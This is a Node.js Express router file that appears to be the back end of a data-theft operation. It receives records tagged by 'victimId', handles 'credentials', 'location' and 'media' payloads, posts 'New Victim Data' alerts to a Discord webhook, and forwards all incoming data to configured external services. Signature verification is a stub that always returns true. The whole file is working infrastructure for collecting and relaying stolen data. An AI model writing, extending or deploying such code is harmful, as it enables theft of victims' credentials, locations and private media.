hereconst express = require('express');
const router = express.Router();
const axios = require('axios');

// Receive webhook data from clients
router.post('/data', async (req, res) => {
    try {
        const { victimId, dataType, payload, signature } = req.body;
        
        // Verify signature if needed
        if (signature && !verifySignature(req.body)) {
            return res.status(401).json({ error: 'Invalid signature' });
        }
        
        // Process the data based on type
        await processWebhookData(victimId, dataType, payload);
        
        // Send to external services if configured
        await forwardToExternalServices(req.body);
        
        res.json({ status: 'success', received: true });
        
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ error: 'Processing failed' });
    }
});

// Discord webhook integration
router.post('/discord', async (req, res) => {
    try {
        const { victimId, message, data } = req.body;
        
        const discordPayload = {
            embeds: [{
                title: "🚨 New Victim Data",
                color: 0xff0000,
                fields: [
                    {
                        name: "Victim ID",
                        value: victimId,
                        inline: true
                    },
                    {
                        name: "Data Type", 
                        value: message,
                        inline: true
                    },
                    {
                        name: "Timestamp",
                        value: new Date().toISOString(),
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        };
        
        // Send to Discord webhook
        await axios.post(process.env.DISCORD_WEBHOOK_URL, discordPayload);
        
        res.json({ status: 'success' });
        
    } catch (error) {
        console.error('Discord webhook error:', error);
        res.status(500).json({ error: 'Discord notification failed' });
    }
});

async function processWebhookData(victimId, dataType, payload) {
    // Process different types of data
    switch(dataType) {
        case 'credentials':
            await processCredentials(victimId, payload);
            break;
        case 'location':
            await processLocation(victimId, payload);
            break;
        case 'media':
            await processMedia(victimId, payload);
            break;
        default:
            await processGenericData(victimId, dataType, payload);
    }
}

async function forwardToExternalServices(data) {
    // Forward to configured external services
    const services = JSON.parse(process.env.EXTERNAL_SERVICES || '[]');
    
    for (const service of services) {
        try {
            await axios.post(service.url, data, {
                headers: service.headers || {}
            });
        } catch (error) {
            console.warn(`Failed to forward to ${service.name}:`, error.message);
        }
    }
}

function verifySignature(data) {
    // Implement signature verification logic
    return true; // Placeholder
}

module.exports = router;
